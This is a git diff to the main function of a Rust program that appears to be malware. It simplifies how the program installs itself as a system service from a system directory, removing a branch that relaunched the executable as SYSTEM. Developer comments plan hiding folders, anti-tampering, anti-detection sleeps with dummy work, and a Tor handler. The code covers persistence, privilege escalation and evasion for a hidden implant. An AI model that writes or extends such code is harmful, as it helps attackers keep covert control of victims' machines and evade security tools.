@@ -161,26 +161,10 @@ fn main() {
         }
     } else {
         if is_running_from_system_dir {
-            let is_system = is_system().unwrap_or_else(|error| {
-                err!("is_system Error, assuming false: ", error);
-                false
-            });
-            if is_system {
-                tag!("SYS-SERVICE-INSTALL");
+            tag!("SYS-SERVICE-INSTALL");
 
-                if let Err(error) = install_system_service() {
-                    err!("install_system_service Error: ", error);
-                }
-            } else {
-                tag!("LAUNCH-SYS-SERVICE-INSTALL");
-                if
-                    let Err(error) = try_spawn_program_as_system(
-                        get_current_exe().unwrap().to_str().unwrap(),
-                        None
-                    )
-                {
-                    err!("try_spawn_program_as_system Error: ", error);
-                }
+            if let Err(error) = install_system_service() {
+                err!("install_system_service Error: ", error);
             }
         } else if !mib_config.cln_up_done {
             tag!("INITIAL-SERVICE-INSTALL");
@@ -195,7 +179,4 @@ fn main() {
 
 // hide folders?
 // add FULL anti tampering
-
-// add sleep with dummy work in between for anti detect
 // fix tor handler logger abomination
-// in logger setup so that we save last log and if identical - we use (count) that repeats AND rewrite logger with thought
